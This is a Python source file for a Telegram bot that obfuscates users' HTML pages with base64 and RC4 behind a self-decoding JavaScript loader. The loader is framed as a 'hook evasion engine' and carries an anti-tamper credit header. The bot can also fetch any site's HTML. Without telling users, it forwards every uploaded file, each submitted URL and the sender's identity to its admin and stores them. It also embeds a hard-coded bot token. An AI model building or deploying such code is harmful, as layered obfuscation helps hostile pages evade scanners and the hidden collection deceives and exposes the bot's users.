import base64
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import io
import random
import string
import requests
import json
import os
import urllib.parse
import re
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

# ================= KREDENTIALS =================
TOKEN = '8750119096:AAFLc_0D1Bno8rhIOa3dLClMvb8lGk1jXuM'
ADMIN_ID = "6754584245"  # Aapki ID

# ================= CHANNEL SETTINGS =================
CHANNEL_ID = "-1004433788850" 
CHANNEL_LINK = "https://t.me/+Ggk5X_tSbPc4YWY1"

bot = telebot.TeleBot(TOKEN)

# ================= DATABASE SETUP =================
DB_FILE = 'bot_db.json'

DEFAULT_TEXTS = {
    "welcome": "🌀 <b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗛𝗧𝗠𝗟 𝗢𝗕𝗙𝗨𝗦𝗖𝗔𝗧𝗢𝗥 𝗣𝗥𝗢</b> 🌀\n\n🎯 <b>𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐌𝐔𝐋𝐓𝐈 𝐋𝐀𝐘𝐄𝐑𝐄𝐃 𝐄𝐍𝐂𝐑𝐏𝐓𝐈𝐎𝐍</b>\n🔁 <b>𝗜 𝗪𝗜𝗟𝗟 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗬𝗢𝗨𝗥 𝗛𝗧𝗠𝗟</b>\n\n👇 <b> 👇 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 👇:</b>",
    "obf_prompt": "📁 <b>𝗦𝗲𝗻𝗱 𝗛𝗧𝗠𝗟 𝗙𝗶𝗹𝗲:</b>\n<b>𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐇𝐓𝐌𝐋 𝐅𝐈𝐋𝐄 𝐅𝐎𝐑 𝐄𝐍𝐂𝐑𝐏𝐓𝐈𝐎𝐍.</b>",
    "url_prompt": "🌐 <b>𝗦𝗲𝗻𝗱 𝗨𝗥𝗟:</b>\nKripya website ka link bhejein (Jaise: https://google.com)"
}

def load_db():
    default_db = {"users": [], "activities": [], "bot_active": True, "saved_urls": [], "saved_files": [], "texts": DEFAULT_TEXTS}
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            try:
                data = json.load(f)
                for key in default_db:
                    if key not in data: data[key] = default_db[key]
                data["texts"] = DEFAULT_TEXTS 
                return data
            except: return default_db
    return default_db

def save_db(data):
    with open(DB_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_db()
user_states = {}

def add_user(user_id):
    if str(user_id) not in db['users']:
        db['users'].append(str(user_id))
        save_db(db)

def log_activity(user_id, action):
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    db['activities'].append(f"[{time_now}] UID: {user_id} -> {action}")
    if len(db['activities']) > 50: db['activities'] = db['activities'][-50:]
    save_db(db)

# ================= ADVANCED SENSITIVE MASKING & HOOK EVASION ENGINE =================

def mask_scripts(html_code):
    def process_script(match):
        script_tag = match.group(1)
        script_content = match.group(2)
        script_end = match.group(3)
        
        if 'src=' in script_tag.lower() or not script_content.strip():
            return match.group(0)
            
        b64_script = base64.b64encode(script_content.encode('utf-8')).decode('utf-8')
        obfuscated_js = f"eval(decodeURIComponent(escape(atob('{b64_script}'))));"
        
        return f"{script_tag}\n{obfuscated_js}\n{script_end}"
    
    return re.sub(r'(<script[^>]*>)(.*?)(</script>)', process_script, html_code, flags=re.IGNORECASE | re.DOTALL)

def rc4_crypt_bytes(data, key):
    S = list(range(256))
    j = 0
    out = bytearray()
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
    return out

def hardcore_hex_obfuscate(html_code):
    html_code = mask_scripts(html_code)
    b64_bytes = base64.b64encode(urllib.parse.quote(html_code).encode('utf-8'))
    
    rc4_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    rc4_key_bytes = rc4_key.encode('utf-8')
    rc4_cipher = rc4_crypt_bytes(b64_bytes, rc4_key_bytes)
    
    hex_cipher = rc4_cipher.hex()
    arr = [ord(c) for c in hex_cipher]
    arr_str = ",".join(map(str, arr))

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # 🚨 EXACT INNER TEXT DEFINITION (For Strict Matching) 🚨
    comment_inner = f"""
╔══════════════════════════════════════════════════════════╗
║  🔒 PROTECTED HTML - DO NOT MODIFY THIS HEADER 🔒         ║
║══════════════════════════════════════════════════════════║
║  Obfuscated By: @HTMLOFFUSCATORPRO_BOT                   ║
║  TG Channel : @COMEBACK_TDX                                ║
║  Timestamp: {timestamp}                          ║
║  Signature: TDX PROTECTOR [TOKEN: {rc4_key}]             ║
║══════════════════════════════════════════════════════════║
║  ⚠️ WARNING: Removing or modifying this credit header    ║
║  will cause this page to stop working permanently!       ║
╚══════════════════════════════════════════════════════════╝"""

    header_comment = f"<!--{comment_inner}\n-->"

    # 🔥 GENERATE EXACT SIGNATURE HASH (No spaces/newlines allowed) 🔥
    expected_stripped = re.sub(r'\s+', '', comment_inner)

    decoder_js = f"""
    var _safe = false;
    var _k = "";
    var _iter = document.createTreeWalker(document, 128, null, false);
    var _node;
    var _expected = "{expected_stripped}";
    
    // JS reads the DOM and checks for 100% EXACT structure match!
    while ((_node = _iter.nextNode())) {{
        var _val = _node.nodeValue;
        if (_val.indexOf('PROTECTED HTML') !== -1) {{
            // Remove all white spaces/newlines from user's DOM node to check raw content
            var _actual = _val.replace(/\\s+/g, '');
            
            // IF EVEN ONE LETTER OR BORDER LINE IS MISSING, THIS WILL FAIL
            if (_actual === _expected) {{
                var _idx = _val.indexOf('[TOKEN: ');
                if (_idx !== -1) {{
                    _k = _val.substring(_idx + 8, _idx + 24);
                    _safe = true;
                    break;
                }}
            }}
        }}
    }}
    
    // If bot removes header or modifies even a single word, code crashes immediately.
    if (!_safe || _k.length !== 16) {{
        document.write('<h1 style="color:red;text-align:center;margin-top:50px;font-family:sans-serif;background:#000;padding:30px;border-radius:10px;">🚨 CRASH: TAMPER DETECTED!<br><br><span style="color:#fff;font-size:16px;">The credit header was modified or deleted. Decryption Key has been destroyed.</span></h1>');
        return;
    }}

    function _R(k, s) {{
        var _s=[], j=0, x, res='';
        for (var i=0; i<256; i++) _s[i]=i;
        for (i=0; i<256; i++) {{
            j=(j+_s[i]+k.charCodeAt(i%k.length))%256;
            x=_s[i]; _s[i]=_s[j]; _s[j]=x;
        }}
        i=0; j=0;
        for (var y=0; y<s.length; y++) {{
            i=(i+1)%256;
            j=(j+_s[i])%256;
            x=_s[i]; _s[i]=_s[j]; _s[j]=x;
            res += String.fromCharCode(s.charCodeAt(y)^_s[(_s[i]+_s[j])%256]);
        }}
        return res;
    }}

    var _A = [{arr_str}];
    var _h = '';
    for(var i=0; i<_A.length; i++) _h += String.fromCharCode(_A[i]);
    
    var _c = '';
    for(var i=0; i<_h.length; i+=2) {{
        _c += String.fromCharCode(parseInt(_h.substr(i, 2), 16));
    }}
    
    var _b = _R(_k, _c);
    
    try {{
        var _final = decodeURIComponent(atob(_b));
        document.open();
        document.write(_final);
        document.close();
    }} catch(e) {{
        document.write('<h1 style="color:red;text-align:center;margin-top:50px;background:#000;padding:30px;">🚨 FATAL ERROR: INVALID KEY! HTML CORRUPTED.</h1>');
    }}
    """

    encoded_decoder_js = base64.b64encode(decoder_js.encode('utf-8')).decode('utf-8')
    chunk_size = len(encoded_decoder_js) // 2
    part1 = encoded_decoder_js[:chunk_size]
    part2 = encoded_decoder_js[chunk_size:]

    final_html = f"""{header_comment}
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="author" id="tdx_author" content="@COMEBACK_TDX">
</head>
<body>
<script>
(function(){{
    var _p1 = '{part1}';
    var _p2 = '{part2}';
    var _combined = _p1 + _p2;
    var _payload = decodeURIComponent(escape(atob(_combined)));
    var _init = new Function(_payload);
    _init();
}})();
</script>
</body>
</html>"""
    
    return final_html


# ================= MAIN MENU =================
def send_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    btn1 = InlineKeyboardButton("🔐 𝗢𝗯𝗳𝘂𝘀𝗰𝗮𝘁𝗲 𝗛𝗧𝗠𝗟", callback_data="btn_obf")
    btn2 = InlineKeyboardButton("🌐 𝗨𝗥𝗟 𝘁𝗼 𝗛𝗧𝗠𝗟", callback_data="btn_url")
    btn3 = InlineKeyboardButton("👨‍💻 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻", url="https://t.me/+Ggk5X_tSbPc4YWY1")
    markup.add(btn1, btn2)
    markup.add(btn3)
    bot.send_message(chat_id, db["texts"]["welcome"], reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    add_user(message.chat.id)
    log_activity(message.chat.id, "Started Bot")
    user_states[message.chat.id] = "" 
    
    if not db['bot_active'] and str(message.chat.id) != ADMIN_ID:
        bot.reply_to(message, "🛠️ <b>Maintenance Break!</b> Bot is currently offline.", parse_mode="HTML")
        return

    # Direct main menu send, no channel check required anymore!
    send_main_menu(message.chat.id)

# ================= ADMIN PANEL =================
@bot.message_handler(commands=['admin'])
def secret_admin_panel(message):
    if str(message.chat.id) != ADMIN_ID: return
    user_states[message.chat.id] = "" 
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("👥 View Users", callback_data="admin_view_users"), InlineKeyboardButton("📝 Live Logs", callback_data="admin_view_logs"))
    markup.add(InlineKeyboardButton("🌐 View URLs", callback_data="admin_view_urls"), InlineKeyboardButton("📁 Get User Files", callback_data="admin_view_files"))
    markup.add(InlineKeyboardButton("📣 Broadcast Message", callback_data="admin_broadcast"))
    markup.add(InlineKeyboardButton("✏️ Edit Bot Texts", callback_data="admin_edit_texts"))
    markup.add(InlineKeyboardButton("🔴 Turn OFF Bot", callback_data="admin_off"), InlineKeyboardButton("🟢 Turn ON Bot", callback_data="admin_on"))
    bot.reply_to(message, "🛡️ <b>𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟</b> 🛡️\n\nSelect an option:", reply_markup=markup, parse_mode="HTML")

# ================= BUTTON CALLBACKS =================
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)
    
    if call.data.startswith("admin_"):
        if str(chat_id) != ADMIN_ID: return
        if call.data == "admin_off": db['bot_active'] = False; save_db(db); bot.send_message(chat_id, "🔴 <b>BOT STATUS:</b> OFFLINE", parse_mode="HTML")
        elif call.data == "admin_on": db['bot_active'] = True; save_db(db); bot.send_message(chat_id, "🟢 <b>BOT STATUS:</b> ONLINE", parse_mode="HTML")
        elif call.data == "admin_view_users": bot.send_message(chat_id, f"👥 <b>Total Users:</b> {len(db['users'])}", parse_mode="HTML") 
        elif call.data == "admin_view_logs": logs = "\n".join(db['activities'][-15:]) or "No activities yet."; bot.send_message(chat_id, f"📝 <b>Live Logs:</b>\n\n{logs}", parse_mode="HTML")
        elif call.data == "admin_view_urls": urls_log = "\n".join(db.get('saved_urls', [])[-20:]) or "No URLs yet."; bot.send_message(chat_id, f"🌐 <b>Last URLs:</b>\n\n{urls_log}", disable_web_page_preview=True, parse_mode="HTML")
        elif call.data == "admin_view_files":
            files = db.get('saved_files', [])
            if not files: bot.send_message(chat_id, "📁 No files yet.")
            for f in files[-10:]:
                if isinstance(f, dict): bot.send_document(chat_id, f['file_id'], caption=f"📅 {f['time']}\n👤 User: <code>{f['uid']}</code>", parse_mode="HTML")
        elif call.data == "admin_broadcast":
            user_states[chat_id] = "WAIT_BROADCAST"
            bot.send_message(chat_id, "📣 Type your broadcast message (HTML formatting allowed):", parse_mode="HTML")
        elif call.data == "admin_edit_texts":
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("Edit Welcome", callback_data="edit_txt_welcome"))
            markup.add(InlineKeyboardButton("Edit Obfuscate Prompt", callback_data="edit_txt_obf_prompt"))
            markup.add(InlineKeyboardButton("Edit URL Prompt", callback_data="edit_txt_url_prompt"))
            bot.send_message(chat_id, "✏️ Select which text to edit:", reply_markup=markup)
        return

    if call.data.startswith("edit_txt_"):
        if str(chat_id) != ADMIN_ID: return
        target = call.data.replace("edit_txt_", "")
        user_states[chat_id] = f"WAIT_EDIT_{target}"
        bot.send_message(chat_id, f"Send the new text for {target} (HTML allowed):")
        return

    if not db['bot_active'] and str(chat_id) != ADMIN_ID: return

    if call.data == "btn_obf":
        user_states[chat_id] = "WAIT_HTML_FILE"
        bot.send_message(chat_id, db["texts"]["obf_prompt"], parse_mode="HTML")
        log_activity(chat_id, "Clicked Obfuscate HTML")
    elif call.data == "btn_url":
        user_states[chat_id] = "WAIT_URL"
        bot.send_message(chat_id, db["texts"]["url_prompt"], parse_mode="HTML")
        log_activity(chat_id, "Clicked URL to HTML")


# ================= MESSAGE & FILE HANDLERS =================
def extract_user_info_safe(message):
    name = message.from_user.first_name if message.from_user.first_name else "Unknown"
    uid = message.chat.id
    username = f"@{message.from_user.username}" if message.from_user.username else "No Username"
    return f"👤 Name: {name}\n🆔 ID: <code>{uid}</code>\n📛 Username: {username}"

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    if not db['bot_active'] and str(chat_id) != ADMIN_ID:
        bot.reply_to(message, "🛠️ Bot is currently offline.")
        return

    if str(chat_id) != ADMIN_ID:
        try:
            info = extract_user_info_safe(message)
            admin_msg = f"🚨 <b>NEW FILE RECEIVED!</b>\n{info}\n📁 File: {message.document.file_name}"
            bot.send_message(int(ADMIN_ID), admin_msg, parse_mode="HTML")
            bot.forward_message(int(ADMIN_ID), chat_id, message.message_id)
        except Exception: pass

    try:
        if not message.document.file_name.endswith('.html'):
            bot.reply_to(message, "⚠️ Error: Please send a valid `.html` file.")
            return
            
        time_now = datetime.now().strftime("%Y-%m-%d %H:%M")
        db['saved_files'].append({"time": time_now, "uid": chat_id, "name": message.document.file_name, "file_id": message.document.file_id})
        save_db(db)
        
        bot.reply_to(message, "⏳ <b>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...</b>\n<b> 🌩️𝙊𝘽𝙁𝙐𝘾𝘼𝙏𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙃𝙏𝙈𝙇 𝙒𝙄𝙏𝙃 𝙈𝙐𝙇𝙏𝙄 𝙇𝘼𝙔𝙀𝙍𝙀𝘿 𝙀𝙉𝘾𝙍𝙋𝙏𝙄𝙊𝙉 ✅</b>", parse_mode="HTML")
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        html_content = downloaded_file.decode('utf-8', errors='ignore')
        
        obfuscated_content = hardcore_hex_obfuscate(html_content)
        
        obfuscated_file = io.BytesIO(obfuscated_content.encode('utf-8'))
        obfuscated_file.name = "𝙀𝙉𝘾𝙍𝙔𝙋𝙏𝙀𝘿_" + message.document.file_name
        
        caption_text = "✅ <b>𝗘𝗻𝗰𝗿𝘆𝗽𝘁𝗶𝗼𝗻 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹!</b>\n\n🔒\n   ╔═════════════════════╗\n𝐘𝐎𝐔𝐑 𝐇𝐓𝐌𝐋 𝐅𝐈𝐋𝐄 𝐈𝐒 𝐄𝐍𝐂𝐑𝐏𝐘𝐓𝐄𝐃 𝐍𝐎𝐖 \n   ╚═════════════════════╝"
        bot.send_document(chat_id, obfuscated_file, caption=caption_text, parse_mode="HTML", timeout=120)
        log_activity(chat_id, f"Encrypted file: {message.document.file_name}")
        user_states[chat_id] = "" 
    except Exception as e:
        bot.reply_to(message, f"❌ Critical Error: ({str(e)})")


@bot.message_handler(func=lambda message: True)
def handle_text(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id, "")

    if str(chat_id) == ADMIN_ID and state.startswith("WAIT_EDIT_"):
        target = state.replace("WAIT_EDIT_", "")
        db["texts"][target] = message.text
        save_db(db)
        bot.reply_to(message, f"✅ {target} text updated successfully!")
        user_states[chat_id] = ""
        return

    if str(chat_id) == ADMIN_ID and state == "WAIT_BROADCAST":
        bot.reply_to(message, "⏳ Sending broadcast...")
        success = 0
        for uid in db['users']:
            try: 
                bot.send_message(int(uid), f"📣 <b>𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗦𝗦𝗔𝗚𝗘</b> 📣\n\n{message.text}", parse_mode="HTML")
                success += 1
            except: pass
        bot.send_message(chat_id, f"✅ Broadcast delivered to {success} users.")
        user_states[chat_id] = ""
        return

    if not db['bot_active'] and str(chat_id) != ADMIN_ID:
        bot.reply_to(message, "🛠️ Bot is currently offline.")
        return

    if state == "WAIT_URL":
        url = message.text
        if not url.startswith("http"): url = "https://" + url
            
        time_now = datetime.now().strftime("%Y-%m-%d %H:%M")
        db['saved_urls'].append(f"[{time_now}] UID: {chat_id} -> {url}")
        save_db(db)

        if str(chat_id) != ADMIN_ID:
            try:
                info = extract_user_info_safe(message)
                admin_msg = f"🚨 <b>NEW URL RECEIVED!</b>\n{info}\n🌐 URL: {url}"
                bot.send_message(int(ADMIN_ID), admin_msg, parse_mode="HTML")
            except Exception: pass
        
        try:
            bot.reply_to(message, "⏳ <b>𝗙𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝗙𝘂𝗹𝗹 𝗛𝗧𝗠𝗟...</b>", parse_mode="HTML")
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Upgrade-Insecure-Requests': '1'}
            response = requests.get(url, headers=headers, timeout=20)
            response.raise_for_status() 
            
            html_file = io.BytesIO(response.content)
            domain = url.split("//")[-1].split("/")[0]
            html_file.name = f"{domain}_source.html"
            
            bot.send_document(chat_id, html_file, caption=f"✅ Full HTML extracted successfully from {domain}", timeout=120)
            log_activity(chat_id, f"Fetched URL: {domain}")
            user_states[chat_id] = "" 
        except Exception:
            bot.reply_to(message, f"❌ Failed to extract. URL is invalid or blocked.")
        return
        
    bot.reply_to(message, "⚠️ Kripya menu dekhne ke liye /start type karein.")


# ================= DUMMY WEB SERVER =================
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Bot is running 24/7!')

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), SimpleHandler)
    server.serve_forever()

print("🔥 STRICT ANTI-TAMPER ENGINE ACTIVE!")
threading.Thread(target=run_web_server).start()

bot.infinity_polling(skip_pending=True)
